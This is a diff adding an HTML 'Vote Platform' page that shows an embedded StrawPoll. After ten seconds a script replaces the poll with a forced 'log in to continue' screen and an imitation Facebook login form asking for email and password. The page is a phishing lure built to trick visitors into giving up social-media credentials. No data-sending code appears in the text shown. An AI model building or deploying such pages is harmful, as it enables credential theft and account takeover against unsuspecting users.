@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vote Platform</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-black text-white flex items-center justify-center min-h-screen">
+
+    <!-- Iframe Container -->
+    <div id="iframe-container" class="w-full h-full fixed inset-0">
+        <iframe 
+            src="https://strawpoll.com/embed/NMnQNpeM0g6" 
+            class="w-full h-full border-none" 
+            frameborder="0" 
+            allowfullscreen 
+            allowtransparency>
+        </iframe>
+    </div>
+
+    <!-- Login Prompt -->
+    <div id="login-prompt" class="hidden fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center text-white">
+        <h2 class="text-2xl font-bold mb-4">You must log in to continue</h2>
+        <div class="space-x-4">
+            <button 
+                class="bg-blue-500 px-6 py-3 rounded-md font-semibold hover:bg-blue-400 transition" 
+                onclick="showFacebookLogin()">Login with Facebook</button>
+            <button 
+                class="bg-pink-500 px-6 py-3 rounded-md font-semibold hover:bg-pink-400 transition">
+                Login with Instagram
+            </button>
+            <button 
+                class="bg-blue-400 px-6 py-3 rounded-md font-semibold hover:bg-blue-300 transition">
+                Login with Twitter
+            </button>
+        </div>
+    </div>
+
+    <!-- Facebook Login Form -->
+    <div id="facebook-login" class="hidden fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center text-white">
+        <h2 class="text-2xl font-bold mb-4">Login with Facebook</h2>
+        <form class="w-full max-w-sm">
+            <div class="mb-4">
+                <label for="email" class="block text-sm font-medium">Email</label>
+                <input 
+                    type="email" 
+                    id="email" 
+                    class="w-full px-4 py-2 rounded-md bg-gray-700 text-white focus:ring focus:ring-blue-500" 
+                    placeholder="Enter your email" 
+                    required>
+            </div>
+            <div class="mb-4">
+                <label for="password" class="block text-sm font-medium">Password</label>
+                <input 
+                    type="password" 
+                    id="password" 
+                    class="w-full px-4 py-2 rounded-md bg-gray-700 text-white focus:ring focus:ring-blue-500" 
+                    placeholder="Enter your password" 
+                    required>
+            </div>
+            <button 
+                type="submit" 
+                class="w-full bg-blue-600 py-3 rounded-md font-semibold hover:bg-blue-500 transition">
+                Login
+            </button>
+        </form>
+    </div>
+
+    <script>
+        // Timer for displaying the login prompt after 10 seconds
+        setTimeout(() => {
+            // Hide iframe and show login prompt
+            document.getElementById("iframe-container").classList.add("hidden");
+            document.getElementById("login-prompt").classList.remove("hidden");
+        }, 10000); // 10 seconds timer
+
+        // Show Facebook login form
+        function showFacebookLogin() {
+            document.getElementById("login-prompt").classList.add("hidden");
+            document.getElementById("facebook-login").classList.remove("hidden");
+        }
+    </script>
+</body>
+</html>
